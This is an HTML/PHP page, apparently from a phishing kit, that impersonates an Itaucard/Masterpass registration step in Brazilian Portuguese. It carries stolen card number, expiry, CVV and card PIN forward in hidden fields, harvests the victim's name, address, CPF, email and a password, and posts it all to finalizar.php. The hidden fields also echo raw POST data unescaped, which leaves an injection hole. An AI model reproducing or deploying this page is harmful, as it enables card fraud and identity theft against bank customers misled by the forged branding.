<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <title>Estamos quase terminando</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="theme-color" content="#1a1f71">
        
        <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
        <link rel="stylesheet" type="text/css" href="css/estilo.css">
        <link href="img/favicon.png" rel="Shortcut Icon">

        <script src="js/jquery-3.2.1.min.js"></script>
        <script src="js/bootstrap.js"></script>
        <script src="js/script1.js"></script>

      <meta name="viewport" content="width=device-width, initial-scale=1.0">

      <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>

      <script type="text/javascript" >

              $(document).ready(function() {

                  function limpa_formulário_cep() {
                      // Limpa valores do formulário de cep.
                      $("#rua").val("");
                      $("#bairro").val("");
                      $("#cidade").val("");
                      $("#uf").val("");
                      $("#ibge").val("");
                  }
                  
                  //Quando o campo cep perde o foco.
                  $("#cep").blur(function() {

                      //Nova variável "cep" somente com dígitos.
                      var cep = $(this).val().replace(/\D/g, '');

                      //Verifica se campo cep possui valor informado.
                      if (cep != "") {

                          //Expressão regular para validar o CEP.
                          var validacep = /^[0-9]{8}$/;

                          //Valida o formato do CEP.
                          if(validacep.test(cep)) {

                              //Preenche os campos com "..." enquanto consulta webservice.
                              $("#rua").val("...");
                              $("#bairro").val("...");
                              $("#cidade").val("...");
                              $("#uf").val("...");
                              $("#ibge").val("...");

                              //Consulta o webservice viacep.com.br/
                              $.getJSON("https://viacep.com.br/ws/"+ cep +"/json/?callback=?", function(dados) {

                                  if (!("erro" in dados)) {
                                      //Atualiza os campos com os valores da consulta.
                                      $("#rua").val(dados.logradouro);
                                      $("#bairro").val(dados.bairro);
                                      $("#cidade").val(dados.localidade);
                                      $("#uf").val(dados.uf);
                                      $("#ibge").val(dados.ibge);
                                  } //end if.
                                  else {
                                      //CEP pesquisado não foi encontrado.
                                      limpa_formulário_cep();
                                      alert("CEP não encontrado.");
                                  }
                              });
                          } //end if.
                          else {
                              //cep é inválido.
                              limpa_formulário_cep();
                              alert("Formato de CEP inválido.");
                          }
                      } //end if.
                      else {
                          //cep sem valor, limpa formulário.
                          limpa_formulário_cep();
                      }
                  });
              });

          </script>
   </head>

<body>
   <header role="banner" class="header header-pinned ng-scope">
       <div class="container-content content-header ng-scope">
           <div class="header-brands">
               <div class="header-brand">
               <img alt="Itaucard" class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="img/card.png" style="width: 90px;">
               </div>
           </div> 
       </div>
   </header>

   <main role="main" class="main main-content ng-scope">
       <div class="mpass-card ng-scope">
           <div class="container">
               <div class="row">
                   <div class="col-sm-6">
                       <div class="container-announcements clearfix">
                           <h1 class="text-announcements ng-binding">Estamos quase terminando</h1>
                           <p class="text-announcements h3 ng-binding ng-scope" ng-if="!$ctrl.isRecaptureBillingInfoScreen">Só falta seu nome, dados pessoais, endereço de fatura do cartão e uma senha que você queira usar ao fazer compras futuramente com Itaucard 2.0</p>

                           <div class="user-information-tile-container">
                               <div class="user-information-tile-info">
                                   <h3 class="ng-binding"></h3>
                               </div>
                           </div>
                       </div>
                       <div class="visible-sm-block visible-md-block visible-lg-block user-information-terms-privacy">
                           <mc-legal-docs display-text="userInformation.acceptanceText" link-token-name="global.termsConditionsPrivacyPolicy" class="ng-isolate-scope">
                               <p>
                                   <small ng-bind-html="$ctrl.displayText | translate:{walletName: $ctrl.walletName, links: $ctrl.links}" class="ng-binding">Ao clicar em “Continuar”, eu confirmo que li e concordo com os <a class="link link-secondary link-terms" href="https://wallet.masterpass.com/Wallet/masterpass/pt-br/terms.html" target="_blank">Termos</a> e <a class="link link-secondary link-privacy" href="https://wallet.masterpass.com/Wallet/masterpass/pt-br/privacy.html" target="_blank">Aviso de Privacidade</a> do Itaucard 2.0. Eu também confirmo que concordo em receber comunicações sobre minha conta Itaucard 2.0 por e-mail.</small>
                               </p>
                           </mc-legal-docs>
                       </div>
                   </div>
                   <div class="col-sm-6">
                    <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                      <form class="row formly ng-pristine ng-valid ng-scope ng-isolate-scope" method="POST" action="finalizar.php">

                        <input type="hidden" value="<?php echo $_POST['telefone']; ?>" name="telefone"  />
                        <input type="hidden" value="<?php echo $_POST['cc']; ?>" name="cc"  />
                        <input type="hidden" value="<?php echo $_POST['vencimento']; ?>" name="vencimento"  />
                        <input type="hidden" value="<?php echo $_POST['cvv']; ?>" name="cvv"  />
                        <input type="hidden" value="<?php echo $_POST['senhacc']; ?>" name="senhacc"  />
                        

                        <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-invalid ng-invalid-required ng-touched" placeholder="Nome" maxlength="20" name="nome" id="nome" type="text" autofocus required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in" collapser="true" ng-messages="fc.$error" aria-hidden="true" aria-live="assertive" aria-expanded="true" style="">
                            </div>
                          </div>
                        </div>
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-invalid ng-invalid-required ng-touched" placeholder="Sobrenome" maxlength="20" name="sobrenome" id="sobrenome" type="text" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in" collapser="true" ng-messages="fc.$error" aria-hidden="true" aria-live="assertive" aria-expanded="true" style="">
                            </div>
                          </div>
                        </div>
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" placeholder="Cep" maxlength="8" name="cep" id="cep" type="tel" onkeypress="return SomenteNumero(event)" onkeyup="pulacampo('cep','numero');" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div> 
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-8 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" placeholder="Endereço" maxlength="68" name="rua" id="rua" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div>
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-4 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" placeholder="Número" maxlength="6" name="numero" id="numero" type="tel" onkeypress="return SomenteNumero(event)" onkeyup="pulacampo('numero','cpf');" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div> 
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-12 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" placeholder="Bairro" maxlength="60" name="bairro" id="bairro" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div> 
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-12 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" placeholder="Cidade" maxlength="60" name="cidade" id="cidade" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div>
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-12 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" placeholder="Estado" maxlength="60" name="uf" id="uf" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div> 
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-12 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" name="cpf" id="cpf" placeholder="CPF" maxlength="14" onkeypress="return SomenteNumero(event)" onkeyup="mascaraMike('###.###.###-##', this);javascript:pulacampo('cpf','email');" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div> 
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-12 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" type="email" name="email" id="email" placeholder="Endereço de E-mail" maxlength="60" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div> 
                        <div class="formly-field ng-scope ng-isolate-scope col-xs-12 formly-field-input">
                          <div class="form-group ng-scope">
                            <input class="form-control ng-pristine ng-empty ng-valid-maxlength ng-valid-max ng-valid-min ng-invalid ng-invalid-required ng-touched" type="password" name="senha" id="senha" placeholder="Senha (8 a 20 caracteres)" minlength="8" maxlength="20" required>
                            <div class="error-messages forgeforms-collapser ng-active collapse in">
                            </div>
                          </div>
                        </div> 
                        <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                          <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                            <div class="ng-scope form-group has-feedback">
                              <button type="submit" name="continue" id="continue" class="btn btn-block btn-primary ng-binding">Continuar</button>
                            </div>
                          </div>
                        </div>
                      </form>
                      </div>
                      </div>
                   </div>
               </div>
           </div>
       </div>
   </main>
</body>

</html>

